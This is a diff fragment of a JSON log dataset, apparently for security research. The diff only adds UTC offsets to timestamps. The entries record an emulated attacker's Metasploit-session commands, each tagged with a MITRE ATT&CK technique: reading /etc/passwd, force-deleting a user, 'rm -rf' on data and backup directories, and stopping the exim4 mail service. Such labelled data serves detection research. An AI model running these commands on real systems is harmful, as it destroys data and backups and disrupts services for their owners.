       "source_file": "CAM-LDS: sequences/3_ssh_apt-28/attacker/logs/attackmate.json",
       "command": "cat /etc/passwd",
@@ -2369,7 +2369,7 @@
       "techniques": "T1087.001",
       "technique_name": "Account Discovery: Local Account",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:48:07.171055",
+        "start-datetime": "2025-12-12T10:48:07.171055+00:00",
         "type": "msf-session",
         "cmd": "cat /etc/passwd",
         "parameters": {
@@ -2399,7 +2399,7 @@
     {
       "raw_id": "EVT-1044",
       "seq": "3_ssh_apt-29",
-      "timestamp": "2025-12-12T10:48:23.359680",
+      "timestamp": "2025-12-12T10:48:23.359680+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-29/attacker/logs/attackmate.json",
       "command": "userdel -f john",
@@ -2407,7 +2407,7 @@
       "techniques": "T1531",
       "technique_name": "Account Access Removal",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:48:23.359680",
+        "start-datetime": "2025-12-12T10:48:23.359680+00:00",
         "type": "msf-session",
         "cmd": "userdel -f john",
         "parameters": {
@@ -2437,7 +2437,7 @@
     {
       "raw_id": "EVT-1045",
       "seq": "3_ssh_apt-30",
-      "timestamp": "2025-12-12T10:48:39.724594",
+      "timestamp": "2025-12-12T10:48:39.724594+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-30/attacker/logs/attackmate.json",
       "command": "rm -rf /media/data/*",
@@ -2445,7 +2445,7 @@
       "techniques": "T1485",
       "technique_name": "Data Destruction",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:48:39.724594",
+        "start-datetime": "2025-12-12T10:48:39.724594+00:00",
         "type": "msf-session",
         "cmd": "rm -rf /media/data/*",
         "parameters": {
@@ -2475,7 +2475,7 @@
     {
       "raw_id": "EVT-1046",
       "seq": "3_ssh_apt-31",
-      "timestamp": "2025-12-12T10:48:56.092586",
+      "timestamp": "2025-12-12T10:48:56.092586+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-31/attacker/logs/attackmate.json",
       "command": "rm -rf /var/backups/*",
@@ -2483,7 +2483,7 @@
       "techniques": "T1490",
       "technique_name": "Inhibit System Recovery",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:48:56.092586",
+        "start-datetime": "2025-12-12T10:48:56.092586+00:00",
         "type": "msf-session",
         "cmd": "rm -rf /var/backups/*",
         "parameters": {
@@ -2513,7 +2513,7 @@
     {
       "raw_id": "EVT-1047",
       "seq": "3_ssh_apt-32",
-      "timestamp": "2025-12-12T10:49:12.468733",
+      "timestamp": "2025-12-12T10:49:12.468733+00:00",
       "source_type": "attackmate",
       "source_file": "CAM-LDS: sequences/3_ssh_apt-32/attacker/logs/attackmate.json",
       "command": "systemctl stop exim4.service",
@@ -2521,7 +2521,7 @@
       "techniques": "T1489",
       "technique_name": "Service Stop",
       "raw_json": {
-        "start-datetime": "2025-12-12T10:49:12.468733",
+        "start-datetime": "2025-12-12T10:49:12.468733+00:00",
         "type": "msf-session",
         "cmd": "systemctl stop exim4.service",
         "parameters": {
